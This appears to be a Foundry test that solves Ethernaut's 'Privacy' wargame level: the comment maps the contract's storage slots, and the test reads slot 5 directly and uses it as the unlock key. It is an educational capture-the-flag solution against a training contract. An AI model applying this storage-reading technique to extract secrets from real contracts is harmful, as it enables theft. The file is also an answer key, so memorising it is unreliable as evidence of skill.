// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "../src/12-Privacy/PrivacyFactory.sol";
import "../src/Ethernaut.sol";

contract PrivacyTest is Test {
    Ethernaut ethernaut;
    address playerAddress = address(6529);

    function setUp() public {
        ethernaut = new Ethernaut();
        vm.deal(playerAddress, 1 ether);
    }

    function testPrivacy() public {
        // Level Setup
        PrivacyFactory privacyFactory = new PrivacyFactory();
        ethernaut.registerLevel(privacyFactory);
        vm.startPrank(playerAddress);
        address levelAddress = ethernaut.createLevelInstance(privacyFactory);
        Privacy ethernautPrivacy = Privacy(payable(levelAddress));

        // Level Attack
        /* Just like the Vault challenge
        // The storage of Privacy contract is like this
        slot0 -> `locked` variable. Even if a boolean does not take 32bytes it cannot be packed with uint256 that take a whole word
        slot1 -> `ID` because it's a uint256 that use 32bytes
        slot2 -> `flattening` + `denomination` + `awkwardness` can be packed together because they take less than 32bytes
        Each element of our array will take 1 entire slot so:
        slot3 -> `data[0]`
        slot4 -> `data[1]`
        slot5 -> `data[2]`
        */
        bytes32 data2 = vm.load(levelAddress, bytes32(uint256(5)));

        bytes16 key = bytes16(data2);
        emit log_named_bytes32("Key", bytes32(key));
        ethernautPrivacy.unlock(key);

        // Level Submission
        bool levelSuccessfullyPassed = ethernaut.submitLevelInstance(payable(levelAddress)); 
        vm.stopPrank();
        assert(levelSuccessfullyPassed);
    }
}